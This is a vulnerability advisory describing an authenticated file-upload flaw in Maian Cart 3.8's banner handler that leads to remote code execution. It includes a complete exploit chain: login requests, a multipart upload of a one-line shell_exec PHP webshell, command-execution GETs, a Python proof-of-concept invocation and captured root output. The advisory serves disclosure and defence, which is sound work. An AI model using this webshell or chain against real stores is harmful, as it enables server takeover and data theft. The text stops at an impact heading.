# Maian Cart 3.8 — Unrestricted Banner Upload in `addBanners` (No Extension Allow-List) → Webshell Write → Authenticated RCE

## 1. Overview

Maian Cart is a self-hosted PHP shopping-cart and e-commerce system distributed by Maian Media (Maian Script World). It is designed to be unpacked directly into a web server document root; the research record asserts, without citing a vendor document, that the product's default production deployment is Apache with mod_php, and it also runs under the PHP built-in web server. The version analysed here is 3.8. The application pairs a public storefront with an administration backend under `/admin/` that is protected by a session-based administrator login and per-form CSRF tokens (`cs_rf`). The installation wizard provisions the global administrator: it writes the operator-chosen `USERNAME` and `PASSWORD` (bcrypt-hashed through the product's `mc_PassHash` helper) into `access.php`, creates the database schema (62 tables in the laboratory installation) and populates the `mc_settings` rows consumed at runtime.

This advisory documents an authenticated unrestricted file upload that yields remote code execution. The Store Banners module of the administration backend accepts banner images through a `multipart/form-data` form and hands the upload to `addBanners()` (`admin/control/classes/class.system.php:376-413`). That handler renames the stored file to `img_<id>.<ext>` — but it takes `<ext>` verbatim from the client-supplied filename and applies no extension allow-list, no MIME validation and no image-content inspection. The file is written with `move_uploaded_file` into `content/_theme_default/images/banners/` under the web root, a directory that, unlike the product's other sensitive directories (`admin/import/`, `admin/attachments/` and `content/_theme_default/cache/` each ship an `.htaccess` file containing `Deny from all`), carries no deny rule whatsoever. Any `.php` stored there is parsed by the PHP interpreter on a plain GET request. An administrator — or anyone who obtains administrator credentials — can therefore upload a one-line `shell_exec` webshell and execute operating-system commands in the web server process context.

The finding is classified as post-authentication: the upload module is reachable only through a webmaster session, and an exhaustive review of the unauthenticated attack surface found no route to this sink (section 3). An administrator login is required; the unauthenticated objective was pursued and ruled out. The chain was dynamically verified end to end against a real 3.8 installation in three independent runs; the laboratory web server process ran as root and command output showed `uid=0(root)`. The primary CVSS 3.1 base score is **7.2** (High) under the vector AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H. A strictly separate deployment-state observation is reported alongside it: the installer-provisioned administrator credential is never forced to rotate (a CWE-798-class companion note in sections 3 and 12). That observation grounds an explicitly conditional PR:N reading and does not change the primary classification — nothing in this advisory should be read as claiming unauthenticated reachability of the upload path.

A keyword search of the national vulnerability database performed at research time identified no entry describing this handler, and no CVE identifier is associated with this finding. The scope of that statement is the search actually performed: the search terms used and the results returned were not retained in the research record, so this advisory does not assert an open-ended absence of prior entries for the product or the vendor. The vendor's product family does have public vulnerability history, which is a further reason not to read the negative search result as an absence claim. The research record additionally notes that the same vendor's sibling product Maian Support exhibits the same CWE-434-class pattern (a `content/` tree without `.htaccess` protection combined with Apache `AllowOverride All`); that product is out of scope for this advisory and no identifier is claimed for it here.

### Overview of the request-to-disk layering

```
L1 external access    : HTTP storefront + /admin/ backend
                        (record-asserted default production form: Apache + mod_php;
                         lab: php -S bound to 127.0.0.1:8765)
L2 session gate       : admin/control/init.php -> mc_getUser() restores the session user;
                        admin/control/system-load.php:79 calls mc_isWebmasterLoggedIn()
                        for cmd=settings and redirects to index.php?p=login when unset
                        (functions.php:324-336 tests isset($user[0..3]))
L3 login handler      : admin/control/modules/system/portal.php:26-47
                        process=1 + cs_rf token + user==USERNAME + mc_PassHash verify
L4 module dispatch    : admin/control/modules/system/settings.php
                        settings.php:84-87: isset($_POST['process_banners'])
                        -> $MCSYS->addBanners()
L5 vulnerable sink    : admin/control/classes/class.system.php:376-413  addBanners()
                        move_uploaded_file with no extension allow-list
                        (sink recorded at class.system.php:401, second site at :410)
L6 web-reachable disk : <docroot>/content/_theme_default/images/banners/img_<id>.<ext>
                        no .htaccess -> a requested .php is executed by the PHP handler
```

## 2. Vulnerability Summary

- **Type**: unrestricted upload of a file with dangerous type (CWE-434) in the administration banner module, realized as OS command execution (CWE-78) through an attacker-supplied PHP webshell. Authenticated — an administrator session is required.
- **Root cause**: `addBanners()` (`admin/control/classes/class.system.php:376-413`) derives the stored extension directly from `$_FILES['image']['name']` via `strrchr(strtolower($name), '.')` at line 392, and applies no allow-list, no MIME check and no `getimagesize()` validation. Recorded line references: raw filename read at :386, `RENAME_BANNERS` branch at :391-395, `move_uploaded_file` sink at :401 with a second call site at :410.
- **Renaming preserves the danger**: with the shipped defaults `RENAME_BANNERS=1` (options.php:308) and `BANNER_PREFIX='img_'` (options.php:307), an upload is renamed to `img_<id>.<ext>` — the rename regenerates the basename but keeps the attacker's extension: `shell.php` lands as `img_1.php`. With `RENAME_BANNERS` disabled the original client filename is used as-is (line 395), which the record notes is worse still.
- **Write-before-record timing**: `move_uploaded_file` executes before the `INSERT INTO banners` statement; even when the INSERT fails (for example because accompanying form fields are missing), the webshell is already on disk.
- **Execution reachability**: the destination `content/_theme_default/images/banners/` is inside the web root and carries no `.htaccess`. The product demonstrably knows the control it is missing: it ships `Deny from all` in `admin/import/.htaccess`, `admin/attachments/.htaccess` and `content/_theme_default/cache/.htaccess`. A GET for the stored `img_<id>.php` is handed to the PHP interpreter.
- **The allow-list exists in the same product but is not used here**: `addAdditionalProductPictures` enforces `$imgAllow = array('.jpg','.jpeg','.png','.gif')` (class.products.php:9, applied at class.products.php:1213 and :1907) through `in_array(strrchr(strtolower($name),'.'), $this->imgAllow)`. The banner handler simply lacks that check — upload validation is inconsistent between handlers of the same product.
- **Result**: an administrator gains arbitrary OS command execution in the web server context. The verified run showed `uid=0(root)` because the laboratory server ran as root; a production Apache+mod_php deployment executes as the web server user (typically www-data or apache), which is still full RCE against the store. The primary score is **7.2** under AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (section 12).
- **Dead-code variant (identified, not counted)**: `uploadWebLogo()` (class.system.php:956) shares the identical no-allow-list pattern with `content/products/` as its target, but no call site exists anywhere in the admin tree, so it is unreachable and excluded from this finding.
- **Companion observation (separate, not a reclassification)**: the installer-provisioned credential in `access.php` is never forced to rotate; sections 3 and 12 carry the CWE-798-class note and the explicitly conditional PR:N reading that depends on it (a reading constructed by this advisory; the research record scores the finding only under a `PR:H` vector).

## 3. Authentication Boundary

### Authentication boundary: the administrator gate in front of the sink

The administration backend enforces a session-based gate ahead of every settings module, including the banner form that hosts the vulnerable upload:

- `admin/control/init.php` restores the session user through `mc_getUser()`; when the `mc_settings` table lacks the expected settings rows (for example `languagePref`), the backend redirects into the installer instead of serving protected pages.
- `admin/control/system-load.php:79` invokes `mc_isWebmasterLoggedIn($sysCartUser)` for `cmd=settings`; an unauthenticated request is redirected to `index.php?p=login`. The underlying check (`functions.php:324-336`) tests `isset($user[0..3])` — that is, a fully populated webmaster session array.
- The login handler (`admin/control/modules/system/portal.php:26-47`) requires a valid CSRF token alongside the credentials: `process=1`, a `cs_rf` value matching the hidden field served on the login page, `user` equal to the `USERNAME` constant from `access.php`, and `pass` verified against the stored hash.
- The upload form itself lives behind that gate: the admin route `?p=settings&s=9` (template `admin/templates/system/settings9.php`) is reachable only with a live webmaster session, and no branch was found that reaches the `process_banners` trigger in `settings.php` while bypassing the check.

```
Login prerequisites — admin/control/modules/system/portal.php:26-47
(compiled from the research record, not a verbatim source quote):

  process = 1
  cs_rf   = CSRF token, extracted from the hidden field name="cs_rf"
            rendered on the login page
  user    = must equal USERNAME  (global administrator constant in access.php,
            provisioned by the install wizard — the product ships no fixed
            factory credential)
  pass    = verified via mc_PassHash(calc, pass, hash=mc_PassHash(add, PASSWORD))
            (bcrypt-based construction)

Session gate for the settings module — admin/control/system-load.php:79:

  mc_isWebmasterLoggedIn($sysCartUser)
    fails  -> redirect to index.php?p=login
    (functions.php:324-336: the check tests isset($user[0..3]), i.e. a
     populated webmaster session array)
```

### Authentication boundary: the unauthenticated objective was exhausted and ruled out

The research programme also pursued the fully unauthenticated objective. Every candidate route recorded was refuted, which is what makes PR:H the defensible primary metric rather than an assumption:

```
persistent admin cookie construction = mc_encrypt(SECRET_KEY . DB_NAME)

  SECRET_KEY : per-installation key (the laboratory completed the product's
               post-install runtime checks, which include renaming the install
               directory and changing SECRET_KEY)
  DB_NAME    : per-installation database name chosen in the install wizard;
               it is not remotely discoverable, so an external attacker cannot
               even address the correct cookie, let alone forge its value
```

- `ajax.php` is reachable without a session, but the recorded review found no RCE sink behind it — it exposes no file-write or command primitive that an unauthenticated caller can steer.
- Forging the persistent administrator cookie is infeasible: the cookie is keyed by `mc_encrypt(SECRET_KEY . DB_NAME)` (the record notes this construction produces the cookie name), so forgery requires the per-installation `DB_NAME`, which cannot be learned remotely.
- No usable deserialization gadget exists: the gadget survey recorded only PHPMailer's `__destruct`, which is not exploitable into a dangerous sink in this codebase — there is no POP chain.
- The login path is not injectable: credential handling runs through `mc_safeImport` plus `mc_getTableData` and hash comparison (`password_verify`-style via `mc_PassHash`); no SQL injection was identified in the authentication queries.
- Every `move_uploaded_file` call site identified in the product sits under the gated `/admin/` backend; no unauthenticated upload endpoint exists.

The sink is therefore reachable only with a valid administrator session. This advisory claims no unauthenticated route and scores the primary finding PR:H.

### Authentication boundary: companion observation — installer-provisioned credential without forced rotation

One deployment-state observation belongs next to the boundary analysis, and it must not be conflated with it. Maian Cart ships no fixed factory credential: the installation wizard writes the operator-chosen `USERNAME`/`PASSWORD` into `access.php`, and the product enforces no first-login rotation of that credential — the credential file's own comments merely suggest deleting `access.php` as optional hardening, i.e. the vendor's hardening story is a manual step, not an enforced one. Where an installation retains installer-era, weak, or otherwise known credentials, an attacker who obtains them holds a full administrator session and the entire chain in this advisory becomes reachable from the internet with no further prerequisites. This is recorded as a CWE-798-class companion observation (persistent provisioned credentials without a rotation gate) and it is the sole basis for the explicitly conditional CVSS reading in section 12 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8, conditional on unchanged, known credentials — a deployment property, not a product property). That `PR:N` reading and its 9.8 figure are **this advisory's own construction and not a score produced by the research record**: the record scores this finding only under a `PR:H` vector, with a note that practical exploitability is higher where provisioned credentials are never forced to rotate, and the record's own conclusion on the unauthenticated objective is that it was not reached. The primary classification is unchanged: `addBanners` itself is reachable only through an administrator session, so the primary score remains the PR:H reading published throughout this advisory.

## 4. Attack Surface

### Attack surface: the banner module route, form and trigger

The vulnerable feature is the Store Banners sub-page of the administration settings module. The recorded surface elements:

- Route: `/admin/index.php?p=settings&s=9`, dispatched through `admin/index.php` → `control/init.php` → `control/system-load.php` (cmd=settings, webmaster gate at system-load.php:79) → `control/modules/system/settings.php`.
- Form: `admin/templates/system/settings9.php` renders `<form method="post" action="?p=settings&s=9" enctype="multipart/form-data">` with a hidden `process_banners=yes` field and a file field named `image`. The accompanying text fields recorded from the form are `text`, `url`, `bannerLive`, `bannerHome` and `trade`.
- Trigger: `settings.php:84-87` dispatches the upload the moment the marker field is present:

```php
if (isset($_POST['process_banners'])) {   // settings.php:84-87
  $MCSYS->addBanners();
  $OK = true;
}
```

- The `trade` field selects the destination theme folder: `'yes'` substitutes `TRADE_THEME_FOLDER` into `BANNER_FOLDER` (`'{theme}/images/banners'`), anything else substitutes `THEME_FOLDER` — `content/_theme_default` by default (init.php:36). Both substitutions land under the web-served `content/` tree, so this field changes the URL of the stored shell without gating it in any way.

### Attack surface: the upload handlers across the product

The record enumerates the product's upload handlers and their differing validation states — the inconsistency is itself an audit signal:

- `addBanners()` / `updateBanners()` (class.system.php) — no extension allow-list. `addBanners` is the verified exploit path of this advisory. The record's remediation note groups `updateBanners` with `addBanners` as needing the same allow-list; the update path was not separately analysed or exercised, so no exploitation claim is made for it here.
- `addAdditionalProductPictures` (class.products.php:1213 and :1907) — allow-list enforced (`$imgAllow`, class.products.php:9). This is the pattern the banner handler should have carried.
- `uploadImportFile` (import module) — recorded as applying a different validation regime; its storage directory `admin/import/` additionally carries an `.htaccess` with `Deny from all`, so even a validation slip is not executable there.
- `uploadWebLogo()` (class.system.php:956) — no allow-list (the same defect pattern as `addBanners`, targeting `content/products/`) but dead code: no call site exists in `/admin/`; excluded from this finding.
- Unauthenticated surface (`ajax.php`) — reachable without a session but recorded as exposing no RCE or file-write sink (section 3).

## 5. Sink Identification

### Sink identification: the addBanners handler source

The following is the recorded source of `addBanners()` with the research record's line references (comments translated; the code itself is quoted from the record):

```php
public function addBanners() {                     // class.system.php:376
  $_POST = mc_safeImport($_POST);                  // :377 applies mysqli_real_escape_string
                                                   // to $_POST only — $_FILES is never touched
  if (isset($_POST['trade']) && $_POST['trade']=='yes') {
    $folder = str_replace('{theme}', TRADE_THEME_FOLDER, BANNER_FOLDER);
  } else {
    $folder = str_replace('{theme}', THEME_FOLDER, BANNER_FOLDER);
  }                                                // -> content/_theme_default/images/banners
  $temp = $_FILES['image']['tmp_name'];
  $name = $_FILES['image']['name'];                // :386 raw client filename, no sanitization
  $size = $_FILES['image']['size'];
  $q = mysqli_query(..., "SELECT `id` FROM `".DB_PREFIX."banners` ORDER BY `id` DESC LIMIT 1");
  $L = mysqli_fetch_object($q);
  if ($temp && $name && $size > 0) {
    if (is_uploaded_file($temp)) {
      if (RENAME_BANNERS) {                        // :391 default 1 (options.php:308)
        $ext = strrchr(strtolower($name), '.');    // :392 '.php' survives verbatim — no allow-list
        $file = BANNER_PREFIX . (isset($L->id)?($L->id+1):'1') . $ext;   // :393 -> img_1.php
      } else {
        $file = $name;                             // :395 worse still — raw client filename
      }
      if (@file_exists($this->settings->serverPath.'/'.$folder.'/'.$file)) { @unlink(...); }
      move_uploaded_file($temp, $this->settings->serverPath . '/' . $folder . '/' . $file);
      // :401 SINK — the file is written BEFORE the DB INSERT executes (second site at :410)
      @chmod(..., AFTER_UPLOAD_CHMOD_VALUE);       // 0644 — does not prevent execution
      if (@file_exists(...)) { mysqli_query(... INSERT INTO banners ...); }
    }
  }
}
```

### Sink identification: the absent checks, line by line

- class.system.php:377 — `mc_safeImport` is an SQL-escaping pass over `$_POST` (`mysqli_real_escape_string`); it is not an upload validator, and `$_FILES` never passes through it. The filename component of the upload is therefore completely unsanitized from this point onward.
- class.system.php:386 — `$name = $_FILES['image']['name']` captures the raw client-supplied filename including its extension.
- class.system.php:391-393 — the `RENAME_BANNERS` branch (default 1, options.php:308) computes `$ext = strrchr(strtolower($name), '.')` and `$file = BANNER_PREFIX . (isset($L->id)?($L->id+1):'1') . $ext`. The numeric id comes from `SELECT id FROM <DB_PREFIX>banners ORDER BY id DESC LIMIT 1` — a database counter, not a security control. `strtolower` changes case only; `.php`, `.pHp` and `.PHP` all normalize to `.php`, and `strrchr` faithfully preserves whatever extension the attacker chose.
- class.system.php:395 — with `RENAME_BANNERS` disabled, `$file = $name` stores the upload under its raw client name, removing even the basename regeneration.
- The only guard before the write is `is_uploaded_file($temp)`, which confirms the file arrived via HTTP upload and says nothing about its type or content.
- class.system.php:401 (second recorded call site at :410) — `move_uploaded_file($temp, $this->settings->serverPath . '/' . $folder . '/' . $file)` is the sink. The path constants resolve as follows:

```
RENAME_BANNERS           = 1                          (options.php:308 — shipped default)
BANNER_PREFIX            = 'img_'                     (options.php:307)
BANNER_FOLDER            = '{theme}/images/banners'   (control/options.php:489)
THEME_FOLDER             = 'content/_theme_default'   (init.php:36)
AFTER_UPLOAD_CHMOD_VALUE = 0644                       (recorded; world-readable — does
                                                       not prevent execution)

destination = <serverPath>/content/_theme_default/images/banners/img_<id>.<ext>
              (serverPath is set to the document root during installation)
```

- The `@file_exists` + `@unlink` step before the move silently replaces any existing file of the same name, and the `INSERT INTO banners` statement runs only after the file already exists — a write-before-record ordering that survives even a failing INSERT, so a malformed companion POST does not prevent the shell from landing.
- Nowhere in the handler is there an extension allow-list, a `getimagesize()` call, a MIME/`finfo` check or any content sniffing. Every one of those controls is absent.

### Sink identification: the same product's allow-list, one class away

```php
private $imgAllow = array('.jpg','.jpeg','.png','.gif');    // class.products.php:9

// applied inside addAdditionalProductPictures
// (class.products.php:1213 and class.products.php:1907):
in_array(strrchr(strtolower($name), '.'), $this->imgAllow)
```

The product-image handler uses exactly the one-line test that the banner handler omits. The coexistence of an enforced allow-list in one class and its total absence in another is the root cause of this finding and the strongest argument that the omission is an oversight rather than a design decision.

## 6. Source Identification

### Source identification: the tainted inputs and their entry route

- Primary attacker-controlled source: the filename component of the multipart file field `image` — `$_FILES['image']['name']` — together with the file body delivered as `$_FILES['image']['tmp_name']`. The extension that reaches `move_uploaded_file` is derived from this name verbatim (after `strtolower`), with no filtering in between.
- Secondary source: `$_POST['trade']` (`'yes'`/other) selects which theme-folder constant is substituted into `BANNER_FOLDER` (`TRADE_THEME_FOLDER` versus `THEME_FOLDER`). Both substitutions resolve under the web-served `content/` tree, so this field changes the URL of the stored shell without constraining it.
- Entry route (recorded): `/admin/index.php` → `control/init.php` → `control/system-load.php` (cmd=settings; webmaster gate at system-load.php:79) → `control/modules/system/settings.php` → trigger at settings.php:84-87 → `class.system.php:376 addBanners()`.
- The form feeding this route (`admin/templates/system/settings9.php`) is `multipart/form-data` with the hidden marker `process_banners=yes`; the recorded companion POST fields are `text`, `url`, `bannerLive`, `bannerHome` and `trade`. These fields feed the post-write INSERT only — none of them is validated in a way that constrains the file write itself.

### Source identification: controllability assessment

Full control of two properties that matter: (1) the stored file's extension — any suffix the attacker types, `.php` included, survives to disk; and (2) the stored file's content — arbitrary PHP source, since no content inspection exists. The stored basename prefix (`img_<id>`) is server-generated from the banners-table counter and is irrelevant to execution: `img_1.php` is parsed by the PHP handler exactly like any other `.php` under the document root. The `size > 0` and `is_uploaded_file` conditions are satisfied by any non-empty genuine HTTP upload.

## 7. Data Flow

### Data flow: from administrator request to executed shell

```
attacker (holding an administrator session)
  -> POST /admin/index.php?p=settings&s=9
       (multipart: process_banners=yes, image=shell.php)
  -> system-load.php: mc_isWebmasterLoggedIn  [admin gate passes — session is genuine]
  -> settings.php:84: isset($_POST['process_banners']) -> $MCSYS->addBanners()
  -> class.system.php:376 addBanners()
       $_FILES['image']['name'] = "shell.php"          (no sanitization)
       RENAME_BANNERS=1 -> $ext=".php" -> $file="img_1.php"
       move_uploaded_file(tmp,
         serverPath/content/_theme_default/images/banners/img_1.php)   [SINK]
  -> file on disk BEFORE the DB INSERT runs
  -> GET /content/_theme_default/images/banners/img_1.php?cmd=id
  -> PHP parser executes shell_exec($_GET['cmd'])
       (no .htaccess restriction anywhere under content/)
  -> uid=0(root) in the lab; web server user in production
```

Stage by stage, with the trust decisions each hop makes:

1. An authenticated administrator POSTs the multipart body to `/admin/index.php?p=settings&s=9` with `process_banners=yes` and `image=shell.php`, the file being the 39-byte one-liner `<?php echo shell_exec($_GET["cmd"]); ?>`.
2. The webmaster gate (`mc_isWebmasterLoggedIn` via system-load.php:79) passes because the session is a genuine administrator session. The trust boundary of this finding is the admin login itself — once crossed, nothing downstream re-examines the request.
3. `settings.php:84-87` dispatches to `addBanners()`. `mc_safeImport` escapes `$_POST` for SQL purposes and never touches `$_FILES`.
4. The extension `.php` is extracted at class.system.php:392 via `strrchr` and concatenated onto the server-generated basename `img_<id>` (line 393), where `<id>` derives from the banners-table counter.
5. `move_uploaded_file` (line 401) writes `<serverPath>/content/_theme_default/images/banners/img_1.php`; `chmod 0644` follows; the INSERT into the banners table runs only after the file already exists on disk.
6. A plain GET for `/content/_theme_default/images/banners/img_1.php?cmd=<command>` is served by the web server. No deny rule exists for that path, so the PHP handler parses the file and `shell_exec` runs the `cmd` parameter in the web server process context — `uid=0(root)` in the laboratory capture.

The flow crosses no validation boundary between the multipart parser and the disk write: the only conditional steps are `is_uploaded_file` (did the file arrive via HTTP?), the `file_exists`/`unlink` overwrite step, and the `RENAME_BANNERS` toggle (rename the basename, preserve the extension). None of them is a security decision about file type, content or destination executability.

## 8. Exploit Construction

### Exploit construction: prerequisites

- A valid administrator account. Maian Cart ships no fixed factory credential: the install wizard writes the operator-chosen `USERNAME`/`PASSWORD` into `access.php`. The exploit therefore starts from possession of (or ability to obtain — see the companion observation on unrotated installer credentials in section 3) administrator credentials. The login additionally requires the session-scoped `cs_rf` CSRF token, which the exploit retrieves from the login page itself, so the token is not an obstacle for an attacker who holds credentials.
- The banners directory must exist on disk: `<docroot>/content/_theme_default/images/banners/`. **This is a precondition of the chain and its provenance is not established by this research.** What the laboratory record supports is only this: the directory was absent during the first iteration, `move_uploaded_file` consequently failed with "No such file or directory", and the directory was created manually before a later iteration succeeded. This advisory therefore makes no claim that an initial banner upload through the UI produces that directory. Two points visible in the material examined argue against that reading: `move_uploaded_file` does not create missing directories, so the recorded failure is itself evidence that no earlier upload had produced it, and the handler's only filesystem guard before the sink is an `@file_exists`/`@unlink` test on the destination *file*, not on the directory. No install manifest entry and no create-if-missing code path were identified that would establish which component brings the directory into existence — the installer, the shipped theme tree, an operator step, or another upload path — so a reviewer who needs that boundary resolved should check a clean extraction of the shipped archive for the directory's presence. The shipped PoC surfaces the prerequisite in its failure output rather than silently giving up.
- Default configuration is sufficient: every constant the chain relies on (`RENAME_BANNERS=1`, `BANNER_PREFIX='img_'`, `BANNER_FOLDER='{theme}/images/banners'`, `THEME_FOLDER='content/_theme_default'`) is a shipped default.

### Exploit construction: the three-request chain

Step 1 — obtain the CSRF token, then log in and capture the session cookie:

```
GET /admin/index.php?p=login HTTP/1.1          -> extract hidden field name="cs_rf"

POST /admin/index.php?p=login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

process=1&user=<admin-user>&pass=<admin-pass>&rm=1&cs_rf=<token>
```

Step 2 — upload the webshell through the banner form. The recorded request transcript:

```
POST /admin/index.php?p=settings&s=9 HTTP/1.1
Cookie: PHPSESSID=<admin_session>
Content-Type: multipart/form-data; boundary=----mc_rce_boundary_...

------mc_rce_boundary_...
Content-Disposition: form-data; name="process_banners"

yes
------mc_rce_boundary_...
Content-Disposition: form-data; name="image"; filename="shell.php"
Content-Type: application/octet-stream

<?php echo shell_exec($_GET["cmd"]); ?>
------mc_rce_boundary_...--
```

Response: HTTP 200 rendering the Store Banners page with the banner added (recorded body size 29,824 bytes). The handler has already written `content/_theme_default/images/banners/img_1.php` to disk before rendering it.

Step 3 — execute commands with a plain GET against the stored file:

```
GET /content/_theme_default/images/banners/img_1.php?cmd=id HTTP/1.1
Host: <lab-host>
```

The stored index (`img_1`, `img_2`, ...) depends on the current banners-table counter, so the PoC probes `img_1.php` through `img_<probe-max>.php` with an `echo` marker command and uses the first index whose response contains the marker.

### Exploit construction: payload and shipped tooling

The verified payload is deliberately minimal:

```php
<?php echo shell_exec($_GET["cmd"]); ?>
```

The shipped proof of concept (`exploit/maian_cart_addbanners_upload_webshell_rce.py`, Python standard library only — `urllib`, `http.cookiejar`, `re`, `argparse`, `os`) automates the whole chain: extract `cs_rf` from the login page, log in, confirm the administrator session on the settings page, POST the multipart upload, probe the stored `img_<n>.php` names, execute the `--cmd` argument and print the response. Example invocation against a loopback test instance:

```
python3 maian_cart_addbanners_upload_webshell_rce.py \
  --target http://127.0.0.1:8765 \
  --username <admin-user> --password <admin-pass> \
  --cmd "id;whoami;hostname"
```

Any PHP-executable extension works, because the handler applies no allow-list at all; `.php` is the direct choice under both Apache+mod_php and the PHP built-in server. No image-polyglot construction is necessary — there is no content validation to satisfy.

## 9. Dynamic Verification

### Dynamic verification: what was deployed and against what

The chain was exercised against a real installation of the product, not an emulation or a partial harness:

- Software: Maian Cart 3.8, installed on a Linux laboratory host by running the product's own install wizard to completion — the wizard created 62 database tables and populated `mc_settings`. The product's post-install runtime checks were satisfied by renaming the install directory and changing `SECRET_KEY`.
- Database: MySQL 8.0.46 on a dedicated laboratory schema and account. `sql_mode` was set to the empty string because the product's install schema declares `DEFAULT '0000-00-00'` on date columns, which modern MySQL rejects otherwise.
- Web server: the PHP built-in web server — `php -S 127.0.0.1:8765 -t <docroot>` — bound to loopback only for laboratory safety and started as root for that session. The exact PHP build number behind the `php -S` binary was not captured in the laboratory notes; the finding is not version-sensitive, since the handler applies no allow-list on any PHP version and both mod_php and the built-in server route every `.php` under the document root into the interpreter. The Apache + mod_php stack that the research record asserts as the product's default production deployment — without citing a vendor document — was not run; see "what was not exercised" below.
- Credentials: a global administrator `USERNAME`/`PASSWORD` chosen during the install wizard (values withheld here); the exploit authenticated through the real login flow including the `cs_rf` CSRF token, not by session forgery.

Laboratory bring-up and reproduction commands (paths and identity placeholders redacted):

```
php -S 127.0.0.1:8765 -t <docroot>

python3 maian_cart_addbanners_upload_webshell_rce.py \
  --target http://127.0.0.1:8765 \
  --username <admin-user> --password <admin-pass> \
  --cmd "id;whoami;hostname;head -1 /etc/passwd"
```

### Dynamic verification: recorded request/response evidence

The execution request and its response, as captured in the laboratory record:

```
GET /content/_theme_default/images/banners/img_1.php?cmd=id;whoami;hostname;head+-1+/etc/passwd

HTTP 200

uid=0(root) gid=0(root) groups=0(root)
root
<lab-host>
root:x:0:0:root:/root:/bin/bash
```

Transcription notes: the hostname value in the genuine response is redacted to `<lab-host>`; the `id` output's third-field label was captured under the laboratory host's locale and is normalized to `groups=` here — the identity values (`0(root)`) are verbatim. No other alteration was made.

The full automated script run produced the following (status lines, byte sizes and command output verbatim from the capture; the tool's message strings are shown translated from the language of the original capture):

```
[*] Target: http://127.0.0.1:8765
[+] CSRF token: 14e6a5ba7c98c518fa232e87...
[+] Login response: HTTP 200
[+] Login succeeded, administration panel reached
[+] Upload response: HTTP 200, size=29824
[+] webshell written and executing: /content/_theme_default/images/banners/img_1.php
[*] Executing command: id;whoami;hostname;head -1 /etc/passwd
[+] ===== command output =====
uid=0(root) gid=0(root) groups=0(root)
root
<lab-host>
root:x:0:0:root:/root:/bin/bash

[+] ======================
[+] RCE succeeded, webshell path: /content/_theme_default/images/banners/img_1.php
[+] Access pattern: GET /content/_theme_default/images/banners/img_1.php?cmd=<url-encoded command>
exit code: 0
```

Server-side artifact confirming the write, recorded on the laboratory host (timestamp redacted):

```
$ ls -la <docroot>/content/_theme_default/images/banners/
-rw-r--r-- 1 root root 39 <timestamp> img_1.php
```

39 bytes is exactly the length of the one-line webshell `<?php echo shell_exec($_GET["cmd"]); ?>`, and the file is owned by root because the laboratory server process ran as root.

### Dynamic verification: three independent recorded runs

The laboratory record documents three runs that reached command execution independently of each other:

- Run 1: the manual/scripted chain producing `img_1.php`; `id` returned `uid=0(root) gid=0(root)` with group set `0(root)`.
- Run 2: `whoami;hostname` returned `root` and the laboratory host's hostname (redacted here to `<lab-host>`).
- Run 3: a from-scratch re-analysis pass — an independent reviewer that rebuilt the code audit and re-executed the chain end to end — uploaded a second, distinctly named shell (`shell_INDEP_verify.php`), which the handler stored as `img_3.php`; `id;whoami;hostname;uname -a` returned `uid=0(root)`, `root`, the same host, and the recorded `uname` excerpt `Linux ... x86_64 GNU/Linux`.

The record also documents the tooling's provenance across four iterations: iteration one (manual requests) failed on the missing banners directory and produced the recorded `move_uploaded_file: No such file or directory` error, after which the directory was created manually — no artifact establishes which product component is supposed to create it, so this advisory treats the directory's provenance as an open question rather than describing it as a normal first-upload product (section 8); iteration two (manual requests, directory present) succeeded and yielded `uid=0(root)`; iteration three was the independent re-analysis run above, driven by a pure-standard-library script; iteration four consolidated the flow into the final script that ships with this advisory. An adversarial refutation review accompanied the analysis: it actively searched for a global upload sanitizer, a deny rule for the banners directory, `FilesMatch` restrictions on `.php`, `getimagesize` usage on this path, web-server configuration hardening and install-time hardening, found none, and left the finding standing.

### Dynamic verification: what was not exercised

- The production Apache+mod_php stack was not run. The conclusion that the stored shell executes under Apache rests on static evidence — the product ships `Deny from all` `.htaccess` files for `admin/import/`, `admin/attachments/` and `content/_theme_default/cache/`, and none anywhere under the `content/` image tree that holds banners — combined with the research record's assertion that Apache with mod_php is the product's default production deployment. That assertion is not backed in the record by a vendor document, and it is the sole support for the Apache-side half of this inference; the dynamic evidence in this advisory comes entirely from the PHP built-in server. The PHP built-in server run proves the application-layer defect and document-root execution dynamically.
- A non-root process identity was not demonstrated: the laboratory server ran as root, so `uid=0` was observed. A typical production mod_php deployment runs as www-data or apache; the record states explicitly that execution identity is deployment-dependent, and this advisory claims RCE at whatever identity the web server holds.
- The `updateBanners` edit path, the `TRADE_THEME_FOLDER` branch of the destination selection, and the dead-code `uploadWebLogo` variant were not exercised.
- No post-exploitation was performed beyond identity and file-system probes: no persistence, no lateral movement, no data extraction, no destructive commands.
- Only version 3.8 was tested. No vendor-hosted or third-party production installation was touched at any point; all dynamic work ran against the loopback-bound laboratory instance described above.

## 10. Reachability and Security Impact

### Reachability: all four dimensions under shipped defaults

The record's reachability phase concluded that every dimension of the chain is satisfied in the default configuration:

- Authenticated reachability: after administrator login, the Store Banners page at `?p=settings&s=9` exposes the `process_banners` POST that dispatches `addBanners()` — no additional role, feature toggle or add-on is involved.
- Write reachability: `serverPath` is set to the document root during installation, and `BANNER_FOLDER` (`'{theme}/images/banners'`, control/options.php:489) resolves with `THEME_FOLDER='content/_theme_default'` (init.php:36) into a web-served directory.
- Execution reachability: `content/` carries no `.htaccess` blocking PHP execution — in explicit contrast to `admin/import/.htaccess`, `admin/attachments/.htaccess` and `content/_theme_default/cache/.htaccess`, all of which contain `Deny from all` — so the stored `img_<id>.php` is parsed by the PHP handler on a plain GET.
- Default configuration: `RENAME_BANNERS=1` (options.php:308), `BANNER_PREFIX='img_'` (options.php:307), `BANNER_FOLDER` (control/options.php:489) and `THEME_FOLDER` (init.php:36) — every constant the exploit relies on ships in the state the exploit expects; no configuration drift is required.

The only operational prerequisite outside the attacker's direct control is the existence of the banners directory, and its provenance is **unestablished**. Section 8 records that the directory was absent in the first laboratory iteration, that the upload failed with "No such file or directory" as a result, and that it was created manually before a later iteration succeeded; no artifact examined here establishes which product component creates it in normal use. Because the directory is a precondition of the whole chain, that gap is stated rather than smoothed over: on an installation where the directory does not exist, the write fails until something creates it.

### Reachability: security impact of an executed webshell

Writing arbitrary PHP into an executing directory under the document root is complete application and server compromise:

